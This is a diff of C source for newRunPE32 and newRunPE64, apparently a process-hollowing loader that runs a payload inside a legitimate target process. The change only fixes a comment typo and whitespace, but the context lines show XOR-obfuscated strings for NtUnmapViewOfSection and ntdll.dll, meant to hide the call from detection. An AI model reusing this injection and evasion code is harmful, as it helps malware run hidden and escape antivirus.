@@ -28,11 +28,10 @@ void newRunPE32(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 	DWORD newTargetImageBase;
 	DWORD desiredPayloadImageBase;
 	LPVOID localPayloadCopy;
-	
-	
+		
 	// Obfuscated function name string (keyByte is 0x45)
 	unsigned char obfuscatedNtUnmapViewOfSection[21] = {0x0b, 0x31, 0x10, 0x2b, 0x28, 0x24, 0x35, 0x13, 0x2c, 0x20, 0x32, 0x0a, 0x23, 0x16, 0x20, 0x26, 0x31, 0x2c, 0x2a, 0x2b, 0x45};
-	// Obfuscated library name srting (keyByte is 0x56)
+	// Obfuscated library name string (keyByte is 0x56)
 	unsigned char obfuscatedNtDll[10] = {0x38, 0x22, 0x32, 0x3a, 0x3a, 0x78, 0x32, 0x3a, 0x3a, 0x56};
 	
 	// Init info structures for target process instanciation
@@ -171,7 +170,7 @@ void newRunPE32(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 	}
 	
 	// Free the local payload copy
-	VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);
+	VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);	
 	
 	// Resume main thread of target process
 	if(ResumeThread(targetProcessInfo.hThread) == -1) {
@@ -198,11 +197,11 @@ void newRunPE64(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 	DWORD64 oldTargetImageBase;
 	DWORD64 newTargetImageBase;
 	DWORD64 desiredPayloadImageBase;
-	LPVOID localPayloadCopy;
+	LPVOID localPayloadCopy;	
 	
 	// Obfuscated function name string (keyByte is 0x45)
 	unsigned char obfuscatedNtUnmapViewOfSection[21] = {0x0b, 0x31, 0x10, 0x2b, 0x28, 0x24, 0x35, 0x13, 0x2c, 0x20, 0x32, 0x0a, 0x23, 0x16, 0x20, 0x26, 0x31, 0x2c, 0x2a, 0x2b, 0x45};
-	// Obfuscated library name srting (keyByte is 0x56)
+	// Obfuscated library name string (keyByte is 0x56)
 	unsigned char obfuscatedNtDll[10] = {0x38, 0x22, 0x32, 0x3a, 0x3a, 0x78, 0x32, 0x3a, 0x3a, 0x56};
 	
 	// Init info structures for target process instanciation
@@ -341,7 +340,7 @@ void newRunPE64(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 	}
 	
 	// Free the local payload copy
-	VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);
+	VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);	
 	
 	// Resume main thread of target process
 	if(ResumeThread(targetProcessInfo.hThread) == -1) {
